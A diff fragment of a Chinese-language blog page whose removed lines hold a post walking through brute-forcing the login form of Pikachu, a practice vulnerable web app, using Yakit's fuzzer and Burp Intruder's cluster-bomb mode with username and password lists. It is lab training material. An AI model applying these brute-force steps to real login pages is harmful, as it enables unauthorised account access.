-      <a data-url="http://example.com/2024/01/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/" data-id="clr4cz49o0001pwu4727ffa6a" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-暴力破解" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/08/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="article-date">
-  <time class="post-time" datetime="2024-01-08T01:18:55.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">08</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/08/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">暴力破解</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Yakit暴力破解"><a href="#Yakit暴力破解" class="headerlink" title="Yakit暴力破解"></a>Yakit暴力破解</h3><p>打开Yakit，在Yakit打开的网页输入pikachu的网址。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108092442014.png" alt="image-20240108092442014"></p>
-<p>打开pikachu中的基于表单的暴力破解</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108092158843.png" alt="image-20240108092158843"></p>
-<p>Yakit点击手动劫持</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093048992.png" alt="image-20240108093048992"></p>
-<p>pikachu中随便输入，提交。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093142811.png" alt="image-20240108093142811"></p>
-<p>就提取到来网页</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093232908.png" alt="image-20240108093232908"></p>
-<p>右键，发送到web fuzzer.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093329614.png" alt="image-20240108093329614"></p>
-<p>将原有的username和password删掉。右键添加模糊字典。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093508337.png" alt="image-20240108093508337"></p>
-<p>分别添加。user字典和pass字典。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093537998.png" alt="image-20240108093537998"></p>
-<p>点击发送请求。在点击相应大小。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093926977.png" alt="image-20240108093926977"></p>
-<p>可以看到有一组不同的，说明账号密码为admin，123456.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108094137304.png" alt="image-20240108094137304"></p>
-<h3 id="burp暴力破解"><a href="#burp暴力破解" class="headerlink" title="burp暴力破解"></a>burp暴力破解</h3><p>在浏览器中打开皮卡出，并点击burp链接。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108094821661.png" alt="image-20240108094821661"></p>
-<p>点击拦截请求</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095411463.png" alt="image-20240108095411463"></p>
-<p>输入账号密码，点击运行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095514811.png" alt="image-20240108095514811"></p>
-<p>右键发送到测试器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095610761.png" alt="image-20240108095610761"></p>
-<p>将账号密码添加包括</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095732068.png" alt="image-20240108095732068"></p>
-<p>并将攻击类型选为集束炸弹</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095839350.png" alt="image-20240108095839350"></p>
-<p>点击有效载荷</p>
-<p>有效负载集选择1也就是我们添加的第一个—-用户名</p>
-<p>在清单中加入可用的用户名，也可以导入文件或使用burp自带的字典</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108100424576.png" alt="image-20240108100424576"></p>
-<p>同理另一个选着密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108100631187.png" alt="image-20240108100631187"></p>
-<p>点击开始攻击</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108101010411.png" alt="image-20240108101010411"></p>
-<p>然后点击长，有区别的就可能是正确密码。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108101202368.png" alt="image-20240108101202368"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/08/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" data-id="clr4cz49m0000pwu4gpwog3bq" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">next &amp;raquo;</a>
   </nav>
 </section>
         
@@ -1427,7 +1527,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
